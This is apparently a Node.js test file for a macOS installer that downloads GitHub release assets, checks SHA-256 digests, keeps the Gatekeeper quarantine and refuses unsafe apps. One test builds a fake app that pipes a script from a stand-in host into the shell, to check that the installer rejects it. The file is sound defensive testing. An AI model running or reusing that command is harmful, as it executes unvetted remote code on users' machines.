// The Ronin Installer on a Mac (lib/ronin-installer.mjs): a repo's latest release → its Mac file → checked → installed,
// with Gatekeeper's quarantine kept and REA's word final. Real zips and disk images, a fake GitHub.
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync, chmodSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { test } from 'node:test';
import { installRepo, parseRepo, pickMacAsset } from '../lib/ronin-installer.mjs';

const mac = process.platform === 'darwin';
const sha = (f) => createHash('sha256').update(readFileSync(f)).digest('hex');
function fakeApp(dir, name, script = '#!/bin/sh\necho hello\n') {
  const app = join(dir, `${name}.app`), m = join(app, 'Contents', 'MacOS');
  mkdirSync(m, { recursive: true });
  writeFileSync(join(app, 'Contents', 'Info.plist'), `<?xml version="1.0"?><plist version="1.0"><dict><key>CFBundleExecutable</key><string>${name}</string><key>CFBundleIdentifier</key><string>test.${name}</string></dict></plist>`);
  writeFileSync(join(m, name), script); chmodSync(join(m, name), 0o755);
  return app;
}
/** A fake GitHub: the API answers with `assets`; download URLs serve local files. */
const github = (assets, files) => async (url) => {
  if (url.includes('/releases/latest')) return new Response(JSON.stringify({ tag_name: 'v1.2.0', name: 'One two', assets }), { status: 200 });
  const f = files[url]; return f ? new Response(readFileSync(f), { status: 200 }) : new Response('no', { status: 404 });
};
const asset = (name, file, digest = true) => ({ name, size: readFileSync(file).length, browser_download_url: `https://dl.test/${name}`, ...(digest ? { digest: `sha256:${sha(file)}` } : {}) });

test('repo links and the Mac file pick match the CRM', () => {
  assert.deepEqual(parseRepo('https://github.com/ronininc/kingmaker/releases'), { owner: 'ronininc', repo: 'kingmaker' });
  assert.equal(parseRepo('kingmaker'), null);
  const a = (name) => ({ name, browser_download_url: `https://x/${name}`, digest: `sha256:${'b'.repeat(64)}` });
  assert.equal(pickMacAsset([a('A-x64.dmg'), a('A-arm64.dmg'), a('A.exe')]).name, 'A-arm64.dmg');
  assert.equal(pickMacAsset([a('A-arm64.dmg')]).sha256, 'b'.repeat(64));
  assert.equal(pickMacAsset([a('source.zip')]), null);
});

test('a Mac .zip installs its app, quarantined; the old copy goes to the Trash; a bad SHA-256 installs nothing', { skip: !mac && 'macOS only' }, async () => {
  const d = mkdtempSync(join(tmpdir(), 'ronin-inst-')), home = join(d, 'home'), dest = join(d, 'Applications'), dl = join(d, 'Downloads');
  try {
    mkdirSync(dest, { recursive: true }); mkdirSync(join(home, '.Trash'), { recursive: true });
    const src = join(d, 'src'); mkdirSync(src); fakeApp(src, 'Hello');
    const zip = join(d, 'Hello-macos-universal.zip'); execFileSync('/usr/bin/ditto', ['-c', '-k', '--keepParent', join(src, 'Hello.app'), zip]);
    fakeApp(dest, 'Hello', '#!/bin/sh\necho old\n');
    const fetchImpl = github([asset('Hello-linux.tar.gz', zip), asset('Hello-macos-universal.zip', zip)], { 'https://dl.test/Hello-macos-universal.zip': zip });
    const r = await installRepo('acme/hello', { fetchImpl, downloads: dl, dest, home });
    assert.equal(r.ok, true, r.line); assert.match(r.line, /^Installed Hello \(acme\/hello v1\.2\.0, SHA-256 checked\)/); assert.match(r.line, /old copy is in the Trash/);
    assert.equal(readFileSync(join(dest, 'Hello.app/Contents/MacOS/Hello'), 'utf8'), '#!/bin/sh\necho hello\n');
    assert.match(execFileSync('/usr/bin/xattr', ['-p', 'com.apple.quarantine', join(dest, 'Hello.app')]).toString(), /^0081;[0-9a-f]+;Kingmaker;/, 'Gatekeeper still checks it');
    assert.ok(execFileSync('/bin/ls', [join(home, '.Trash')]).toString().includes('Hello (replaced'));

    const bad = github([{ ...asset('Hello-macos-universal.zip', zip), digest: `sha256:${'0'.repeat(64)}` }], { 'https://dl.test/Hello-macos-universal.zip': zip });
    const no = await installRepo('acme/hello', { fetchImpl: bad, downloads: join(d, 'dl2'), dest, home });
    assert.equal(no.ok, false); assert.match(no.line, /didn't match the SHA-256/);
    assert.equal(existsSync(join(d, 'dl2', 'Hello-macos-universal.zip')), false, 'nothing left behind');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('a .dmg installs its app; REA refuses an app that fetches and runs code; a .pkg opens in macOS\'s Installer', { skip: !mac && 'macOS only' }, async () => {
  const d = mkdtempSync(join(tmpdir(), 'ronin-inst-')), home = join(d, 'home'), dest = join(d, 'Applications');
  try {
    mkdirSync(dest, { recursive: true });
    const src = join(d, 'src'); mkdirSync(src); fakeApp(src, 'Disk');
    const dmg = join(d, 'Disk-arm64.dmg'); execFileSync('/usr/bin/hdiutil', ['create', '-quiet', '-srcfolder', src, '-format', 'UDZO', '-volname', 'Disk', dmg]);
    const ok = await installRepo('acme/disk', { fetchImpl: github([asset('Disk-arm64.dmg', dmg)], { 'https://dl.test/Disk-arm64.dmg': dmg }), downloads: join(d, 'dl'), dest, home });
    assert.equal(ok.ok, true, ok.line); assert.ok(existsSync(join(dest, 'Disk.app/Contents/MacOS/Disk')));

    const evil = join(d, 'evil'); mkdirSync(evil); fakeApp(evil, 'Evil', '#!/bin/sh\ncurl -fsSL https://x.example/i.sh | sh\n');
    const ez = join(d, 'Evil-mac.zip'); execFileSync('/usr/bin/ditto', ['-c', '-k', '--keepParent', join(evil, 'Evil.app'), ez]);
    const no = await installRepo('acme/evil', { fetchImpl: github([asset('Evil-mac.zip', ez)], { 'https://dl.test/Evil-mac.zip': ez }), downloads: join(d, 'dl'), dest, home });
    assert.equal(no.ok, false); assert.match(no.line, /REA refused it/); assert.equal(existsSync(join(dest, 'Evil.app')), false);

    const pkg = join(d, 'Tool.pkg'); writeFileSync(pkg, 'xar!');
    const opened = [];
    const p = await installRepo('acme/tool', { fetchImpl: github([asset('Tool.pkg', pkg, false)], { 'https://dl.test/Tool.pkg': pkg }), downloads: join(d, 'dl'), dest, home, open: async (f) => { opened.push(f); return { ok: true }; } });
    assert.equal(p.ok, true); assert.match(p.line, /GitHub recorded no SHA-256.*Installer is open/); assert.equal(opened.length, 1, 'never installed with admin rights: the owner confirms');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('no release, or no Mac file, is said plainly', async () => {
  assert.match((await installRepo('acme/none', { fetchImpl: async () => new Response('{}', { status: 404 }) })).line, /no published release/);
  assert.match((await installRepo('acme/winonly', { fetchImpl: async () => new Response(JSON.stringify({ tag_name: 'v1', assets: [{ name: 'A.exe', browser_download_url: 'https://x/A.exe' }] }), { status: 200 }) })).line, /has no Mac file/);
});

test('"install <repo>" is the installer only when it names a GitHub repo; "install <tool>" stays with the device desk', async () => {
  const { installRequest } = await import('../lib/ronin-installer.mjs');
  assert.equal(installRequest('install ronininc/kingmaker'), 'ronininc/kingmaker');
  assert.equal(installRequest('please install https://github.com/ronininc/xtool'), 'https://github.com/ronininc/xtool');
  assert.equal(installRequest('install the latest release of github.com/a/b.'), 'github.com/a/b', 'a sentence\'s full stop is not part of the name');
  for (const t of ['install ffmpeg', 'install the CLI hub', 'install ronininc/kingmaker and open it', 'how do I install a/b', '']) assert.equal(installRequest(t), null, t);
});
